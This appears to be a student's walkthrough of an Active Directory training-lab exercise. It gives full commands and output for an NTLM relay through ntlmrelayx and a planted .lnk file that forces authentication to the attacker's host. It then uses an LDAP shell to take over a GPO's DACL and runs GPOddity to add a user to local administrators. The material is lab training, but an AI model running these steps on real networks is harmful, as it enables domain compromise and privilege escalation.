# LEARNING OBJECTIVE 6

1. Abuse an overly permissive Group Policy to add studentx to the local 
administrators group on dcorp-ci.

GPO Abuse, on LO 1 through PowerHuntSMBShares we find that dcorp-ci has an interesting share called `AI`

`NOTE: can just go to explorer and type "\\dcorp-ci\AI" to access the share`

Run ntlmrelayx from WSL 

```
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
```

NOTE:
1. Use WSLToTh3Rescue! as the sudo password.
2. Remember to replace the IP with your own student VM.
3. Make sure that Firewall is either turned off on the student VM or you have added exceptions.

Create a .lnk file (by creating a shortcut) with value:
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.x' -UseDefaultCredentials"
```

Copy to \\\\dcorp-ci\ai

```
C:\AD\Tools>xcopy C:\AD\Tools\studentx.lnk \\dcorp-ci\AI
```
After a few minutes:
```
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.214 --http-port '80,8080' -i --no-smb-server
[sudo] password for wsluser:
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up HTTP Server on port 80
[*] Setting up HTTP Server on port 8080
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Connection from 172.16.3.11 controlled, attacking target ldaps://172.16.2.1
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Authenticating against ldaps://172.16.2.1 as DCORP/DEVOPSADMIN SUCCEED
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000 as DCORP/DEVOPSADMIN
[*] HTTPD(80): Client requested path: /
```

Connect to LDAP shell on port 11000
```
PS C:\AD\Tools\netcat-win32-1.12> .\nc.exe 127.0.0.1 11000
Type help for list of commands

# 
```

Provide studentx user with WriteDACL permission over DevOps Policy
```
# write_gpo_dacl student214 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
Adding student214 to GPO with GUID {0BF8D01C-1F62-4BDC-958C-57140B67D147}
LDAP server claims to have taken the secdescriptor. Have fun
```

If no access to any domain users, instead add a computer object and provide it with "write_gpo_dacl" permission on DevOps Policy 
```
# add_computer stdx-gpattack Secretpass@123
Attempting to add a new computer with the name: stdx-gpattack$
Inferred Domain DN: DC=dollarcorp,DC=moneycorp,DC=local
Inferred Domain Name: dollarcorp.moneycorp.local
New Computer DN: CN=stdx-gpattack,CN=Computers,DC=dollarcorp,DC=moneycorp,DC=local
Adding new computer with username: stdx-gpattack$ and password: Secretpass@123 result: OK

# write_gpo_dacl stdx-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
Adding stdx-gpattack$ to GPO with GUID {0BF8D01C-1F62-4BDC-958C-57140B67D147}
LDAP server claims to have taken the secdescriptor. Have fun
```

Now run GPOddity to create new template

```
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student214' --password 'wRUJSsKcuH6Ggntm' --command 'net localgroup administrators student214 /add' --rogue-smbserver-ip '172.16.100.214' --rogue-smbserver-share 'std214-gp' --dc-ip '172.16.2.1' --smb-m
ode none
```

Verify gPCfileSysPath is updated:
```
Get-DomainGPO -Identity 'DevOps Policy' | select gpcfilesyspath

gpcfilesyspath
--------------
\\172.16.100.214\std214-gp
```

Leave GPOddity running, run another WSL session and create and share the stdx-gp directory <br>
`mkdir /mnt/c/AD/Tools/std214-gp` <br>
`cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std214-gp`

On an admin powershell session:
```
net share std214-gp=C:\AD\Tools\std214-gp /grant:Everyone,Full
std214-gp was shared successfully.
```

```
icacls "C:\AD\Tools\std214-gp" /grant Everyone:F /T
processed file: C:\AD\Tools\std214-gp
processed file: C:\AD\Tools\std214-gp\gpt.ini
processed file: C:\AD\Tools\std214-gp\Machine
processed file: C:\AD\Tools\std214-gp\User
processed file: C:\AD\Tools\std214-gp\Machine\comment.cmtx
processed file: C:\AD\Tools\std214-gp\Machine\Microsoft
processed file: C:\AD\Tools\std214-gp\Machine\Preferences
processed file: C:\AD\Tools\std214-gp\Machine\Registry.pol
processed file: C:\AD\Tools\std214-gp\Machine\Scripts
processed file: C:\AD\Tools\std214-gp\Machine\Microsoft\Windows NT
processed file: C:\AD\Tools\std214-gp\Machine\Microsoft\Windows NT\SecEdit
processed file: C:\AD\Tools\std214-gp\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
processed file: C:\AD\Tools\std214-gp\Machine\Preferences\ScheduledTasks
processed file: C:\AD\Tools\std214-gp\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
processed file: C:\AD\Tools\std214-gp\Machine\Scripts\Shutdown
processed file: C:\AD\Tools\std214-gp\Machine\Scripts\Startup
Successfully processed 16 files; Failed processing 0 files
```

In the lab, policy is updated every 2 minutes. After 2 minutes:
```
winrs -r:dcorp-ci cmd /c "set computername && set username"

COMPUTERNAME=DCORP-CI
USERNAME=studentx
```
